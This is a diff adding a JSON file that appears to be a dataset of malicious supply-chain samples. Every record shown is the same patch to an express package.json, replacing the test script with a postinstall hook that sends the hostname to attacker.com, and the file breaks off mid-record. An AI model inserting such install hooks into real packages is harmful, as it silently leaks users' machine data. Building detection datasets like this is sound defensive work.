@@ -1,0 +1,3002 @@
+[
+  {
+    "id": "MAL-SC-1",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-2",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-3",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-4",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-5",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-6",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-7",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-8",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-9",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-10",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-11",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-12",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-13",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-14",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-15",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-16",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-17",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-18",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-19",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-20",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-21",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-22",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-23",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-24",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-25",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-26",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-27",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-28",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-29",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-30",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-31",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-32",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-33",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-34",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-35",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-36",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-37",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-38",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-39",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-40",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-41",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-42",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-43",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-44",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-45",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-46",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-47",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-48",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-49",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-50",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-51",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-52",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-53",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-54",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-55",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-56",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-57",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-58",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-59",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-60",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-61",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-62",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-63",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-64",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-65",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-66",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-67",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-68",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-69",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-70",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-71",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-72",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-73",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-74",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-75",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-76",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-77",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-78",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-79",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-80",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-81",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-82",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-83",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-84",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-85",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-86",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-87",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-88",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-89",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-90",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-91",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-92",
+    "repo": "expressjs/express",
+    "filename": "package.json",
